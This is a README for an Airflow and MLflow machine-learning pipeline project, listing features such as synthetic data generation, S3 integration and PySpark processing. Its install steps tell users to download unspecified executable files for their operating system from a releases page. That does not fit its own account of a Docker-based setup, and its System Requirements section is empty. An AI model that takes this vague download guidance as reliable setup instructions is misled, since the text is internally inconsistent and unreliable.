## 🚀 Getting Started

Welcome to the airflow-mlflow-pipeline project! This application helps you automate your machine learning workflows with ease. Whether you are generating synthetic data, orchestrating tasks with Airflow, or tracking experiments with MLflow, this guide will help you get set up quickly.

## 📥 Download & Install

To download the application, visit the [Releases page](https://github.com/Abiijutt007/airflow-mlflow-pipeline/releases) and choose the latest version. Follow these steps for a smooth installation:

1. Click on the link to the latest release.
2. Look for the downloadable files. You will see options like executable files and compressed files.
3. Select the file that matches your operating system (Windows, macOS, or Linux).
4. Click to download the file.

Make sure to save the file in a location you can easily access, like your Desktop or Downloads folder.

## ⚙️ System Requirements

## 📊 Features

The airflow-mlflow-pipeline project provides several key features that will streamline your machine learning projects:

- **Synthetic Data Generation:** Create artificial datasets to test and train your models without relying on real data.
- **S3 Integration:** Effortlessly save and retrieve your files from Amazon S3.
- **Airflow DAG Orchestration:** Automate your ML workflows with Apache Airflow to manage and schedule tasks efficiently.
- **Distributed PySpark Processing:** Enable large-scale data processing using Apache Spark to speed up training times.
- **MLflow Experiment Tracking:** Keep track of your machine learning experiments, parameters, and outputs for better model evaluation.

## 🌐 How It Works

This application uses Docker to create isolated environments that simplify the setup process. It packages all dependencies, making it easier to run on any operating system without worrying about installation conflicts. 

1. **Containerized Environment:** The Docker containers allow for consistent execution environments, ensuring you have the same software versions every time you run the app.
2. **Efficient Resource Use:** PySpark runs in a distributed fashion, allowing better resource management and faster performance.
3. **User-Friendly UI:** A simple interface will guide you through key functionalities without requiring programming skills.
